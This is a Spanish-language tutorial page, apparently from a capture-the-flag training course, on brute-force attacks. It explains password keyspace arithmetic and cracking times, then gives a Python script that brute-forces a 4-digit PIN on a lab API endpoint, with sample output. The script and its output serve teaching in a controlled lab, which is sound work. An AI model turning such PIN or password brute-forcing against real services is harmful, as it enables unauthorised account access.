
# Ataques de fuerza bruta

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir contraseñas de un usuario y acceder a sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo o en un entorno controlado.
{% endhint %}

***

Para comprender realmente el desafío de la fuerza bruta, es fundamental comprender las matemáticas subyacentes. La siguiente fórmula determina el número total de combinaciones posibles para una contraseña:

```mathml
Combinaciones posibles = Tamaño del conjunto de caracteres^Longitud de la contraseña
```

Por ejemplo, una contraseña de 6 caracteres que usa solo minúsculas (juego de 26 caracteres) tiene 26^6 (aproximadamente 300 millones) combinaciones posibles. En cambio, una contraseña de 8 caracteres con el mismo juego de caracteres tiene 26^8 (aproximadamente 200 mil millones) combinaciones. Añadir mayúsculas, números y símbolos al juego de caracteres amplía exponencialmente el espacio de búsqueda.

Este crecimiento exponencial del número de combinaciones resalta la importancia de la longitud y la complejidad de las contraseñas. Incluso un pequeño aumento en la longitud o la inclusión de tipos de caracteres adicionales puede incrementar drásticamente el tiempo y los recursos necesarios para un ataque de fuerza bruta exitoso.

Consideremos algunos escenarios para ilustrar el impacto de la longitud de la contraseña y el conjunto de caracteres en el espacio de búsqueda:

<table data-header-hidden><thead><tr><th></th><th width="127.66796875"></th><th></th><th></th></tr></thead><tbody><tr><td></td><td>Longitud de la contraseña</td><td>Conjunto de caracteres</td><td>Posibles combinaciones</td></tr><tr><td><code>Corto y simple</code></td><td>6</td><td>Letras minúsculas (az)</td><td>26^6 = 308.915.776</td></tr><tr><td><code>Largo pero simple</code></td><td>8</td><td>Letras minúsculas (az)</td><td>26^8 = 208.827.064.576</td></tr><tr><td><code>Añadir complejidad</code></td><td>8</td><td>Letras minúsculas y mayúsculas (az, AZ)</td><td>52^8 = 53.459.728.531.456</td></tr><tr><td><code>Máxima complejidad</code></td><td>12</td><td>Letras minúsculas y mayúsculas, números y símbolos</td><td>94^12 = 475.920.493.781.698.549.504</td></tr></tbody></table>

Como puede ver, incluso un ligero aumento en la longitud de la contraseña o la inclusión de tipos de caracteres adicionales amplía drásticamente el espacio de búsqueda. Esto aumenta significativamente el número de combinaciones posibles que un atacante debe probar, lo que hace que la fuerza bruta sea cada vez más difícil y lenta. Sin embargo, el tiempo que se tarda en descifrar una contraseña no solo depende del tamaño del espacio de búsqueda, sino también de la capacidad computacional disponible del atacante.

Cuanto más potente sea el hardware del atacante (p. ej., la cantidad de GPU, CPU o recursos informáticos en la nube que pueda utilizar), más intentos de contraseña podrá realizar por segundo. Si bien una contraseña compleja puede tardar años en descifrarse por fuerza bruta con una sola máquina, un atacante sofisticado que utilice una red distribuida de recursos informáticos de alto rendimiento podría reducir drásticamente ese tiempo.

![Gráfico de barras que compara los tiempos de descifrado de contraseñas para computadoras básicas y supercomputadoras con diferentes complejidades de contraseñas.](https://academy.hackthebox.com/storage/modules/57/powern.png)

El gráfico anterior ilustra una relación exponencial entre la complejidad de la contraseña y el tiempo de descifrado. A medida que aumenta la longitud de la contraseña y el conjunto de caracteres, el número total de combinaciones posibles crece exponencialmente. Esto incrementa significativamente el tiempo necesario para descifrar la contraseña, incluso con recursos informáticos potentes.

Comparando la computadora básica y la supercomputadora:

* Computadora básica (1 millón de contraseñas por segundo): Adecuado para descifrar contraseñas simples rápidamente, pero resulta extremadamente lento para contraseñas complejas. Por ejemplo, descifrar una contraseña de 8 caracteres usando letras y dígitos tardaría aproximadamente 6,92 años.
* Supercomputadora (1 billón de contraseñas por segundo): Reduce drásticamente el tiempo de descifrado de contraseñas más simples. Sin embargo, incluso con esta inmensa potencia, descifrar contraseñas muy complejas puede llevar un tiempo impráctico. Por ejemplo, una contraseña de 12 caracteres con todos los caracteres ASCII tardaría unos 15 000 años en descifrarse.

## Descifrando un PIN

Para seguir, veremos el caso práctico en la parte inferior de la página.

La aplicación de instancia genera un PIN aleatorio de 4 dígitos y expone un endpoint (`/pin`) que acepta un PIN como parámetro de consulta. Si el PIN proporcionado coincide con el generado, la aplicación responde con un mensaje de éxito y una bandera. De lo contrario, devuelve un mensaje de error.

Usaremos este sencillo script de demostración de Python para forzar el endpoint `/pin` en la API. Copia y pega este script de Python `pin-solver.py` en tu equipo. Solo necesitas modificar las variables de IP y puerto para que coincidan con la información de tu sistema de destino.

```python
import requests

ip = "127.0.0.1"  # Cambia esto por la dirección IP de tu instancia
port = 1234       # Cambia esto por el número de puerto de tu instancia

# Probar todos los posibles PINs de 4 dígitos (desde 0000 hasta 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convierte el número en una cadena de 4 dígitos (por ejemplo, 7 se convierte en "0007")
    print(f"PIN intentado: {formatted_pin}")

    # Enviar la solicitud al servidor
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Verificar si el servidor responde con éxito y contiene la bandera (flag)
    if response.ok and 'flag' in response.json():  # .ok significa que el código de estado es 200 (éxito)
        print(f"PIN correcto encontrado: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script de Python itera sistemáticamente todos los PIN de 4 dígitos posibles (0000 a 9999) y envía solicitudes GET al endpoint de Flask con cada PIN. Comprueba el código de estado y el contenido de la respuesta para identificar el PIN correcto y capturar la bandera asociada.

```shell-session
afsh4ck@kali$ python pin-solver.py

...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

La salida del script mostrará la progresión del ataque de fuerza bruta, mostrando cada intento de PIN y su resultado. El resultado final mostrará el PIN correcto y la bandera capturada, lo que demuestra la finalización exitosa del ataque de fuerza bruta.
